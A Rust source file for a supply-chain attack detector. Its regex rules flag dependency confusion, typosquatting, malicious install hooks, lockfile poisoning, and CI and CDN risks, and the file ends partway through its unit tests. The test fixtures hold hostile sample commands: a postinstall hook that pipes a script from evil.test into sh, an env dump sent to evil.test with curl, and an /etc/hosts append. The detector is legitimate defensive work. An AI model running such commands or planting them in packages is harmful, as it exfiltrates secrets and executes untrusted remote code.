//! Supply Chain Attack Evaluator

use crate::evaluators::{EvidenceOperation, L2Detection, L2Evaluator, ProofEvidence};
use crate::types::InvariantClass;
use regex::Regex;

pub struct SupplyChainEvaluator;

impl L2Evaluator for SupplyChainEvaluator {
    fn id(&self) -> &'static str {
        "supply_chain"
    }
    fn prefix(&self) -> &'static str {
        "L2 SupplyChain"
    }

    #[inline]

    fn detect(&self, input: &str) -> Vec<L2Detection> {
        let mut dets = Vec::new();
        let decoded = crate::encoding::multi_layer_decode(input).fully_decoded;

        // Dependency confusion: scoped package with internal-looking name
        static dep_confusion: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:@[a-z][\w-]*/)?(?:internal|private|corp|company)[\w-]*").unwrap()
        });
        static INSTALL_CONTEXT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:npm\s+install|pip\s+install|gem\s+install|require|import|from\s)")
                .unwrap()
        });
        if let Some(m) = dep_confusion.find(&decoded) {
            if INSTALL_CONTEXT_RE.is_match(&decoded) {
                dets.push(L2Detection {
                    detection_type: "dependency_confusion".into(),
                    confidence: 0.80,
                    detail: format!("Potential dependency confusion: {}", m.as_str()),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: m.as_str().to_owned(),
                        interpretation:
                            "Package name resembles internal package — dependency confusion attack"
                                .into(),
                        offset: m.start(),
                        property: "Package installations must verify package source and scope"
                            .into(),
                    }],
                });
            }
        }

        // Dependency confusion against public registries
        static public_registry_confusion: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
            || {
                Regex::new(r"(?i)(?:npm\s+install|pip\s+install)[^\n\r]{0,120}(?:internal|private|corp|company)[\w@/\.-]*[^\n\r]{0,120}(?:registry\.npmjs\.org|pypi\.org|--index-url\s+https?://pypi\.org|--registry\s+https?://registry\.npmjs\.org)").unwrap()
            },
        );
        if let Some(m) = public_registry_confusion.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "dependency_confusion".into(),
                confidence: 0.86,
                detail: "Internal-looking package installed from public registry".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Install command mixes private package naming with public registry source"
                            .into(),
                    offset: m.start(),
                    property:
                        "Private package names must resolve only from trusted internal registries"
                            .into(),
                }],
            });
        }

        // Dependency confusion via direct public registry URL paths with internal-looking package names
        static PUBLIC_REGISTRY_URL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
            || {
                Regex::new(r#"(?i)https?://(?P<host>registry\.npmjs\.org|pypi\.org)/(?:simple/)?(?P<pkg>@?[a-z0-9][a-z0-9._/-]{1,120})"#).unwrap()
            },
        );
        for caps in PUBLIC_REGISTRY_URL_RE.captures_iter(&decoded) {
            let host = caps.name("host").map(|m| m.as_str()).unwrap_or_default();
            let pkg = caps.name("pkg").map(|m| m.as_str()).unwrap_or_default();
            if is_internal_looking_package(pkg) {
                let m = caps.get(0).expect("full capture exists");
                dets.push(L2Detection {
                    detection_type: "dependency_confusion".into(),
                    confidence: 0.88,
                    detail: format!("Internal-looking package fetched from public registry ({host})"),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: m.as_str().to_owned(),
                        interpretation: "Public registry URL points to package name that appears private/internal".into(),
                        offset: m.start(),
                        property: "Internal package names must not resolve from public registries".into(),
                    }],
                });
            }
        }

        // Typosquatting common packages
        static TYPOSQUAT_LODASH_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)\blodas[h]?\b").unwrap());
        static TYPOSQUAT_REQUESTS_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)\brequets\b").unwrap());
        static TYPOSQUAT_DJANGO_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)\bdjango[0-9]\b").unwrap());
        let typosquat_patterns = [
            (&*TYPOSQUAT_LODASH_RE, "lodash"),
            (&*TYPOSQUAT_REQUESTS_RE, "requests"),
            (&*TYPOSQUAT_DJANGO_RE, "django"),
        ];
        for (re, target) in typosquat_patterns {
            if let Some(m) = re.find(&decoded) {
                if m.as_str().to_lowercase() != target {
                    dets.push(L2Detection {
                        detection_type: "typosquatting".into(),
                        confidence: 0.78,
                        detail: format!("Potential typosquatting of '{}': {}", target, m.as_str()),
                        position: m.start(),
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: m.as_str().to_owned(),
                            interpretation: format!(
                                "Package name is a typosquat variant of '{}'",
                                target
                            ),
                            offset: m.start(),
                            property: "Package names must be verified against known-good packages"
                                .into(),
                        }],
                    });
                }
            }
        }

        // Typosquatting detection with leetspeak and adjacent transposition checks
        for (pkg, offset) in extract_dependency_candidates(&decoded) {
            if let Some(target) = typosquat_target_for(&pkg) {
                dets.push(L2Detection {
                    detection_type: "typosquatting".into(),
                    confidence: 0.83,
                    detail: format!("Potential typosquatting of '{}' via '{}'", target, pkg),
                    position: offset,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::TypeCoerce,
                        matched_input: pkg.clone(),
                        interpretation: format!("Dependency token resembles known package '{}' with typosquat-like mutation", target),
                        offset,
                        property: "Dependency names must match trusted package identities exactly".into(),
                    }],
                });
            }
        }

        // Malicious install scripts
        static INSTALL_SCRIPT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)"(?:preinstall|postinstall|install)"\s*:\s*"[^"]*(?:curl|wget|bash|sh|node\s+-e|python\s+-c)"#).unwrap()
        });
        let install_script = &*INSTALL_SCRIPT_RE;
        if let Some(m) = install_script.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "malicious_script".into(),
                confidence: 0.90,
                detail: "Package install script executes remote code".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Install lifecycle script downloads and executes remote code"
                        .into(),
                    offset: m.start(),
                    property: "Package install scripts must not execute remote code".into(),
                }],
            });
        }

        // curl|sh and wget -O -|sh style install-time execution
        static pipe_exec: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:curl\s+[^\n\r|]*\|\s*(?:sh|bash)|wget\s+[^\n\r]*-O\s*-\s*\|\s*(?:sh|bash))").unwrap()
        });
        if let Some(m) = pipe_exec.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "malicious_script".into(),
                confidence: 0.92,
                detail: "Install command streams remote script directly into shell".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SemanticEval,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Remote content is executed without integrity verification"
                        .into(),
                    offset: m.start(),
                    property:
                        "Build/install workflows must never execute unverified remote scripts"
                            .into(),
                }],
            });
        }

        // Explicitly enabling npm scripts in CI/install command lines
        static npm_script_enable: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)npm\s+(?:ci|install)[^\n\r]{0,120}(?:--ignore-scripts(?:=|\s+)false|--scripts(?:=|\s+)true)").unwrap()
        });
        if let Some(m) = npm_script_enable.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "malicious_script".into(),
                confidence: 0.84,
                detail: "npm install command explicitly enables lifecycle scripts".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::TypeCoerce,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Command line enables execution of package lifecycle hooks that can be attacker-controlled".into(),
                    offset: m.start(),
                    property: "Untrusted dependency installs should disable lifecycle scripts by default".into(),
                }],
            });
        }

        // Malicious lifecycle hooks: external fetch + /etc/hosts tampering
        static HOOK_FETCH_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)(?:"(?:preinstall|postinstall|install)"\s*:\s*"[^"]{0,400}?(?:curl|wget)\s+https?://|(?:pip\s+install|python\s+setup\.py\s+install).{0,220}?(?:curl|wget)\s+https?://)"#).unwrap()
        });
        if let Some(m) = HOOK_FETCH_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "malicious_script".into(),
                confidence: 0.93,
                detail: "Install hook fetches remote content during dependency installation".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SemanticEval,
                    matched_input: m.as_str()[..m.as_str().len().min(140)].to_owned(),
                    interpretation: "Lifecycle/install context performs network retrieval that can execute attacker-controlled content".into(),
                    offset: m.start(),
                    property: "Install hooks must not fetch and execute remote code".into(),
                }],
            });
        }

        static HOOK_HOSTS_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)(?:"(?:preinstall|postinstall|install)"\s*:\s*"[^"]{0,400}?(?:/etc/hosts|>>\s*/etc/hosts|tee\s+-a\s+/etc/hosts)|(?:pip\s+install|python\s+setup\.py\s+install).{0,220}?(?:/etc/hosts|>>\s*/etc/hosts|tee\s+-a\s+/etc/hosts))"#).unwrap()
        });
        if let Some(m) = HOOK_HOSTS_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "malicious_script".into(),
                confidence: 0.94,
                detail: "Install hook attempts /etc/hosts modification".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str()[..m.as_str().len().min(140)].to_owned(),
                    interpretation: "Lifecycle script modifies host resolution file, indicating potential persistence or traffic hijack".into(),
                    offset: m.start(),
                    property: "Dependency install scripts must not alter system host configuration".into(),
                }],
            });
        }

        // package-lock lockfile poisoning signals
        static LOCKFILE_POISON_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)"integrity"\s*:\s*"(?:sha1|sha512)-(?:0{8,}|[A-Za-z0-9+/=]{0,20})".{0,240}"resolved"\s*:\s*"http://"#).unwrap()
        });
        let lockfile_poison = &*LOCKFILE_POISON_RE;
        if let Some(m) = lockfile_poison.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "lockfile_poisoning".into(),
                confidence: 0.82,
                detail: "Suspicious lockfile integrity/resolved combination".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str()[..m.as_str().len().min(100)].to_owned(),
                    interpretation:
                        "Weak or malformed integrity hash paired with insecure resolved URL".into(),
                    offset: m.start(),
                    property: "Lockfiles must enforce strong integrity hashes and secure transport"
                        .into(),
                }],
            });
        }

        // Lockfile manipulation: weak integrity strings, URL substitutions, and patch-like tampering hunks
        static LOCKFILE_INTEGRITY_TAMPER_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
            || {
                Regex::new(r#"(?is)(?:^|\n)\s*(?:"?integrity"?\s*[:=]\s*"?(?:sha1-[A-Za-z0-9+/=]{1,40}|sha512-(?:0{8,}|A{8,}|[A-Za-z0-9+/=]{0,18})))"#).unwrap()
            },
        );
        if let Some(m) = LOCKFILE_INTEGRITY_TAMPER_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "lockfile_poisoning".into(),
                confidence: 0.81,
                detail: "Potential lockfile integrity field tampering".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().trim().to_owned(),
                    interpretation: "Integrity value looks weak, truncated, or synthetic".into(),
                    offset: m.start(),
                    property: "Lockfile integrity hashes must be strong and untampered".into(),
                }],
            });
        }

        static LOCKFILE_REGISTRY_SUB_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
            || {
                Regex::new(r#"(?is)(?:"resolved"\s*:\s*"https?://(?P<host>[a-z0-9.-]+)[^"]*"|resolved\s+"https?://(?P<yarnhost>[a-z0-9.-]+)[^"]*")"#).unwrap()
            },
        );
        for caps in LOCKFILE_REGISTRY_SUB_RE.captures_iter(&decoded) {
            let host = caps
                .name("host")
                .or_else(|| caps.name("yarnhost"))
                .map(|m| m.as_str())
                .unwrap_or_default();
            if !is_trusted_lockfile_host(host) {
                let m = caps.get(0).expect("full capture exists");
                dets.push(L2Detection {
                    detection_type: "lockfile_poisoning".into(),
                    confidence: 0.85,
                    detail: format!(
                        "Lockfile resolved URL points to non-standard registry host '{}'",
                        host
                    ),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: m.as_str().to_owned(),
                        interpretation:
                            "Package resolution endpoint differs from trusted registry domains"
                                .into(),
                        offset: m.start(),
                        property:
                            "Lockfiles must not redirect package fetches to untrusted registries"
                                .into(),
                    }],
                });
            }
        }

        static LOCKFILE_DIFF_TAMPER_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| {
                Regex::new(r#"(?im)^[+-]\s*"?(?:integrity|resolved)"?\s*[:=].*$"#).unwrap()
            });
        if let Some(m) = LOCKFILE_DIFF_TAMPER_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "lockfile_poisoning".into(),
                confidence: 0.79,
                detail: "Diff-like lockfile mutation for integrity/resolved fields detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().trim().to_owned(),
                    interpretation:
                        "Patch context modifies lockfile trust anchors (integrity/resolved)".into(),
                    offset: m.start(),
                    property: "Lockfile trust fields require strict review and origin validation"
                        .into(),
                }],
            });
        }

        // CDN integrity bypass: third-party scripts without SRI
        static SCRIPT_TAG_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)<script\b[^>]*\bsrc\s*=\s*['"][^'"]+['"][^>]*>"#).unwrap()
        });
        for m in SCRIPT_TAG_RE.find_iter(&decoded) {
            let tag = m.as_str();
            if tag.to_ascii_lowercase().contains(" integrity=") {
                continue;
            }
            if let Some(src) = extract_script_src(tag) {
                if let Some(host) = extract_host_from_url(&src) {
                    if is_third_party_cdn_host(host) {
                        dets.push(L2Detection {
                            detection_type: "cdn_integrity_bypass".into(),
                            confidence: 0.87,
                            detail: format!("Third-party CDN script lacks SRI: {}", src),
                            position: m.start(),
                            evidence: vec![ProofEvidence {
                                operation: EvidenceOperation::SemanticEval,
                                matched_input: tag[..tag.len().min(140)].to_owned(),
                                interpretation: "External script tag omits integrity hash, enabling silent upstream tampering".into(),
                                offset: m.start(),
                                property: "Third-party scripts must include Subresource Integrity checks".into(),
                            }],
                        });
                    }
                }
            }
        }

        // Manifest confusion: dependency aliasing or package identity mismatch
        static NPM_ALIAS_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)"(?P<decl>@?[a-z0-9][a-z0-9._/-]{1,120})"\s*:\s*"npm:(?P<actual>@?[a-z0-9][a-z0-9._/-]{1,120})@[^"]+""#).unwrap()
        });
        for caps in NPM_ALIAS_RE.captures_iter(&decoded) {
            let declared = caps.name("decl").map(|m| m.as_str()).unwrap_or_default();
            let actual = caps.name("actual").map(|m| m.as_str()).unwrap_or_default();
            if normalize_package_name(declared) != normalize_package_name(actual) {
                let m = caps.get(0).expect("full capture exists");
                dets.push(L2Detection {
                    detection_type: "manifest_confusion".into(),
                    confidence: 0.84,
                    detail: format!("Manifest alias '{}' resolves to different package '{}'", declared, actual),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::TypeCoerce,
                        matched_input: m.as_str().to_owned(),
                        interpretation: "Manifest-declared dependency name does not match installed package identity".into(),
                        offset: m.start(),
                        property: "Manifest declarations must not disguise package identity through alias indirection".into(),
                    }],
                });
            }
        }

        static MANIFEST_NAME_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)"name"\s*:\s*"(?P<manifest>@?[a-z0-9][a-z0-9._/-]{1,120})".{0,700}?"node_modules/(?P<actual>@?[a-z0-9][a-z0-9._/-]{1,120})""#).unwrap()
        });
        for caps in MANIFEST_NAME_RE.captures_iter(&decoded) {
            let manifest = caps
                .name("manifest")
                .map(|m| m.as_str())
                .unwrap_or_default();
            let actual = caps.name("actual").map(|m| m.as_str()).unwrap_or_default();
            if normalize_package_name(manifest) != normalize_package_name(actual) {
                let m = caps.get(0).expect("full capture exists");
                dets.push(L2Detection {
                    detection_type: "manifest_confusion".into(),
                    confidence: 0.82,
                    detail: format!("Manifest package name '{}' diverges from installed identity '{}'", manifest, actual),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::SyntaxRepair,
                        matched_input: m.as_str()[..m.as_str().len().min(140)].to_owned(),
                        interpretation: "Observed manifest identity is inconsistent with installed package path identity".into(),
                        offset: m.start(),
                        property: "Manifest and lockfile identities must remain consistent for each package".into(),
                    }],
                });
            }
        }

        // .gitmodules poisoning: suspicious external/insecure submodule URLs
        static GITMODULES_URL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)\[submodule\s+"[^"]+"\].{0,260}?url\s*=\s*(?:git://|http://|https?://(?:\d{1,3}(?:\.\d{1,3}){3}|localhost|127\.0\.0\.1|raw\.githubusercontent\.com))"#).unwrap()
        });
        let gitmodules_url = &*GITMODULES_URL_RE;
        if let Some(m) = gitmodules_url.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "gitmodules_poisoning".into(),
                confidence: 0.82,
                detail: "Suspicious .gitmodules URL source".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str()[..m.as_str().len().min(100)].to_owned(),
                    interpretation: "Submodule URL points to insecure or attacker-controlled location".into(),
                    offset: m.start(),
                    property: "Submodule sources must be pinned to trusted repositories over secure protocols".into(),
                }],
            });
        }

        // Environment exfiltration from install/lifecycle context
        static env_exfil: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)(?:preinstall|postinstall|install|npm\s+(?:ci|install)|pip\s+install).{0,220}?(?:process\.env|printenv|env|\$[A-Z_]{2,}|/proc/self/environ).{0,220}?(?:curl|wget|nc|powershell|Invoke-WebRequest|fetch|axios|requests\.)"#).unwrap()
        });
        if let Some(m) = env_exfil.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "env_exfiltration".into(),
                confidence: 0.91,
                detail: "Potential environment secret exfiltration in dependency/install flow"
                    .into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SemanticEval,
                    matched_input: m.as_str()[..m.as_str().len().min(120)].to_owned(),
                    interpretation:
                        "Install-time script reads environment data and transmits it externally"
                            .into(),
                    offset: m.start(),
                    property:
                        "Build scripts must not exfiltrate environment variables or local secrets"
                            .into(),
                }],
            });
        }

        // GitHub Actions pwn-request injection: untrusted context interpolated into run steps
        static GHA_CONTEXT_REF_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\$\{\{\s*github\.(?:event\.(?:pull_request|issue|review|comment|discussion|workflow_run)\.|head_ref|event\.inputs\.)(?:[^}]+)\}\}").unwrap()
        });
        static GHA_RUN_WITH_CONTEXT_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| {
                Regex::new(r"(?is)run\s*:\s*[\|>]?\s*[^#]*\$\{\{[^}]*github\.(?:event|head_ref)")
                    .unwrap()
            });
        if GHA_CONTEXT_REF_RE.is_match(&decoded) {
            if let Some(m) = GHA_RUN_WITH_CONTEXT_RE.find(&decoded) {
                dets.push(L2Detection {
                    detection_type: "github_actions_pwn_request".into(),
                    confidence: 0.93,
                    detail: "GitHub Actions run step interpolates untrusted PR/issue context".into(),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: m.as_str()[..m.as_str().len().min(180)].to_owned(),
                        interpretation: "Workflow run command includes attacker-influenced GitHub event context that can trigger command injection".into(),
                        offset: m.start(),
                        property: "GitHub Actions run steps must not directly interpolate untrusted event fields".into(),
                    }],
                });
            }
        }

        // Cargo.toml git dependency injection via non-standard repos or raw IP endpoints
        static CARGO_GIT_DEP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)git\s*=\s*["\x27]https?://(?P<url>[^"\x27]+)["\x27]"#).unwrap()
        });
        static CARGO_GIT_DEP_RAW_IP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)git\s*=\s*["\x27]https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"#).unwrap()
        });
        for caps in CARGO_GIT_DEP_RE.captures_iter(&decoded) {
            let m = caps.get(0).expect("full capture exists");
            let url = caps.name("url").map(|v| v.as_str()).unwrap_or_default();
            let mut path_segments = url.split('/');
            let host = path_segments.next().unwrap_or_default().to_ascii_lowercase();
            let first = path_segments.next().unwrap_or_default();
            let second = path_segments.next().unwrap_or_default();
            let github_owner_repo_only = host == "github.com"
                && !first.is_empty()
                && !second.is_empty()
                && path_segments.next().is_none();
            if !github_owner_repo_only {
                dets.push(L2Detection {
                    detection_type: "cargo_git_dep_injection".into(),
                    confidence: 0.85,
                    detail: "Cargo git dependency points to non-standard repository source".into(),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: m.as_str().to_owned(),
                        interpretation: "Dependency source uses a non-standard git endpoint that may be attacker-controlled".into(),
                        offset: m.start(),
                        property: "Cargo git dependencies must resolve to trusted repositories with strict source controls".into(),
                    }],
                });
            }
        }
        if let Some(m) = CARGO_GIT_DEP_RAW_IP_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "cargo_git_dep_injection".into(),
                confidence: 0.85,
                detail: "Cargo git dependency uses a raw IP address endpoint".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Raw IP git endpoints bypass expected repository trust boundaries".into(),
                    offset: m.start(),
                    property: "Cargo git dependencies must not use raw IP address hosts".into(),
                }],
            });
        }

        dets
    }

    fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
        match detection_type {
            "dependency_confusion"
            | "typosquatting"
            | "lockfile_poisoning"
            | "gitmodules_poisoning"
            | "cargo_git_dep_injection" => Some(InvariantClass::DependencyConfusion),
            "malicious_script" => Some(InvariantClass::PostinstallInjection),
            "env_exfiltration" => Some(InvariantClass::EnvExfiltration),
            "cdn_integrity_bypass" | "github_actions_pwn_request" => {
                Some(InvariantClass::PostinstallInjection)
            }
            "manifest_confusion" => Some(InvariantClass::DependencyConfusion),
            _ => None,
        }
    }
}

fn normalize_package_name(name: &str) -> String {
    let trimmed = name.trim().trim_matches('"').trim_matches('\'');
    if let Some(scoped) = normalize_scoped_package_name(trimmed) {
        return scoped;
    }
    let without_version = trimmed
        .split(['@', ' ', ';', ','])
        .next()
        .unwrap_or(trimmed);
    let canonical = without_version.trim_start_matches("npm:");
    canonical.to_ascii_lowercase()
}

fn normalize_scoped_package_name(trimmed: &str) -> Option<String> {
    let canonical = trimmed.trim_start_matches("npm:");
    if !canonical.starts_with('@') {
        return None;
    }
    if let Some((left, right)) = canonical.rsplit_once('@') {
        if !right.contains('/') && !left.is_empty() {
            return Some(left.to_ascii_lowercase());
        }
    }
    Some(canonical.to_ascii_lowercase())
}

fn is_internal_looking_package(pkg: &str) -> bool {
    let canonical = normalize_package_name(pkg);
    let tags = [
        "internal", "private", "corp", "company", "intranet", "platform", "svc",
    ];
    tags.iter().any(|t| canonical.contains(t))
}

fn is_trusted_lockfile_host(host: &str) -> bool {
    let host = host.to_ascii_lowercase();
    [
        "registry.npmjs.org",
        "registry.yarnpkg.com",
        "repo.yarnpkg.com",
        "files.pythonhosted.org",
        "pypi.org",
    ]
    .iter()
    .any(|trusted| host == *trusted || host.ends_with(&format!(".{trusted}")))
}

fn extract_dependency_candidates(decoded: &str) -> Vec<(String, usize)> {
    static INSTALL_NAME_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(r#"(?i)(?:npm\s+install|pnpm\s+add|yarn\s+add|pip\s+install)\s+([@\w\./-]+)"#)
            .unwrap()
    });
    static MANIFEST_DEP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(r#"(?i)"([@a-z0-9][@a-z0-9._/-]{1,120})"\s*:\s*"[^"]+""#).unwrap()
    });
    let mut out = Vec::new();
    for caps in INSTALL_NAME_RE.captures_iter(decoded) {
        if let Some(m) = caps.get(1) {
            out.push((normalize_package_name(m.as_str()), m.start()));
        }
    }
    for caps in MANIFEST_DEP_RE.captures_iter(decoded) {
        if let Some(m) = caps.get(1) {
            out.push((normalize_package_name(m.as_str()), m.start()));
        }
    }
    out
}

fn leetspeak_fold(s: &str) -> String {
    s.chars()
        .map(|c| match c.to_ascii_lowercase() {
            '0' => 'o',
            '1' => 'l',
            '3' => 'e',
            '4' => 'a',
            '5' => 's',
            '7' => 't',
            other => other,
        })
        .collect()
}

fn is_adjacent_transposition(a: &str, b: &str) -> bool {
    if a.len() != b.len() || a.len() < 2 {
        return false;
    }
    let mut idx = None;
    let a_bytes = a.as_bytes();
    let b_bytes = b.as_bytes();
    for i in 0..a_bytes.len() {
        if a_bytes[i] != b_bytes[i] {
            idx = Some(i);
            break;
        }
    }
    let i = if let Some(i) = idx { i } else { return false };
    if i + 1 >= a_bytes.len() {
        return false;
    }
    if a_bytes[i] == b_bytes[i + 1] && a_bytes[i + 1] == b_bytes[i] {
        for j in (i + 2)..a_bytes.len() {
            if a_bytes[j] != b_bytes[j] {
                return false;
            }
        }
        return true;
    }
    false
}

fn typosquat_target_for(pkg: &str) -> Option<&'static str> {
    let canonical = normalize_package_name(pkg);
    let folded = leetspeak_fold(&canonical);
    let targets = [
        "lodash", "react", "requests", "django", "express", "axios", "numpy", "pandas",
    ];
    for target in targets {
        if canonical == target {
            continue;
        }
        if folded == target || is_adjacent_transposition(&canonical, target) {
            return Some(target);
        }
    }
    None
}

fn extract_script_src(script_tag: &str) -> Option<String> {
    static SCRIPT_SRC_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(r#"(?i)\bsrc\s*=\s*['"](?P<src>https?://[^'"]+)['"]"#).unwrap()
    });
    SCRIPT_SRC_RE
        .captures(script_tag)
        .and_then(|caps| caps.name("src").map(|m| m.as_str().to_owned()))
}

fn extract_host_from_url(url: &str) -> Option<&str> {
    let after_scheme = url.split_once("://")?.1;
    let host_port = after_scheme.split('/').next()?;
    Some(host_port.split(':').next().unwrap_or(host_port))
}

fn is_third_party_cdn_host(host: &str) -> bool {
    let host = host.to_ascii_lowercase();
    [
        "unpkg.com",
        "cdn.jsdelivr.net",
        "cdnjs.cloudflare.com",
        "ajax.googleapis.com",
        "code.jquery.com",
        "stackpath.bootstrapcdn.com",
        "cdn.skypack.dev",
        "esm.sh",
    ]
    .iter()
    .any(|cdn| host == *cdn || host.ends_with(&format!(".{cdn}")))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_public_registry_dependency_confusion() {
        let eval = SupplyChainEvaluator;
        let dets =
            eval.detect("npm install @corp-internal/core --registry https://registry.npmjs.org");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "dependency_confusion")
        );
    }

    #[test]
    fn detects_pipe_to_shell_install() {
        let eval = SupplyChainEvaluator;
        let dets = eval.detect(r#"{"postinstall":"curl https://evil.test/x.sh | sh"}"#);
        assert!(dets.iter().any(|d| d.detection_type == "malicious_script"));
    }

    #[test]
    fn detects_lockfile_poisoning_pattern() {
        let eval = SupplyChainEvaluator;
        let dets = eval.detect(
            r#"{"integrity":"sha512-0000000000","resolved":"http://evil.example/pkg.tgz"}"#,
        );
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "lockfile_poisoning")
        );
    }

    #[test]
    fn detects_env_exfiltration_in_install_script() {
        let eval = SupplyChainEvaluator;
        let dets =
            eval.detect(r#"npm install foo && printenv | curl -d @- https://evil.test/collect"#);
        assert!(dets.iter().any(|d| d.detection_type == "env_exfiltration"));
        assert_eq!(
            eval.map_class("env_exfiltration"),
            Some(InvariantClass::EnvExfiltration)
        );
    }

    #[test]
    fn detects_internal_package_name_in_npm_public_registry_url() {
        let eval = SupplyChainEvaluator;
        let dets = eval.detect("GET https://registry.npmjs.org/@company-internal/sdk");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "dependency_confusion")
        );
    }

    #[test]
    fn detects_internal_package_name_in_pypi_public_registry_url() {
        let eval = SupplyChainEvaluator;
        let dets =
            eval.detect("pip install --index-url https://pypi.org/simple/ internal-private-utils");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "dependency_confusion")
        );
    }

    #[test]
    fn detects_typosquat_l0dash() {
        let eval = SupplyChainEvaluator;
        let dets = eval.detect("npm install l0dash");
        assert!(dets.iter().any(|d| d.detection_type == "typosquatting"));
    }

    #[test]
    fn detects_typosquat_raect() {
        let eval = SupplyChainEvaluator;
        let dets = eval.detect("yarn add raect");
        assert!(dets.iter().any(|d| d.detection_type == "typosquatting"));
    }

    #[test]
    fn detects_postinstall_hosts_modification() {
        let eval = SupplyChainEvaluator;
        let dets = eval.detect(r#"{"postinstall":"echo 1.2.3.4 api.internal >> /etc/hosts"}"#);
        assert!(dets.iter().any(|d| d.detection_type == "malicious_script"));
    }

    #[test]
    fn detects_lockfile_registry_url_substitution() {
